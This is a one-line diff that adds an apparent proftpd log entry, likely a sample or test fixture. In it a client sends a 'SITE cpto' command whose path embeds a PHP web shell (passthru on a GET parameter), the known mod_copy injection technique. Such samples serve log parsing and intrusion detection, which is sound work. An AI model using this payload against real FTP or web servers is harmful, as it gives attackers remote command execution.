@@ -1,0 +1,1 @@
+proftpd: 172.16.10.1:57679: SITE cpto /var/tmp/.<?php passthru($_GET["cmd"]);echo m3rg3 ;?>
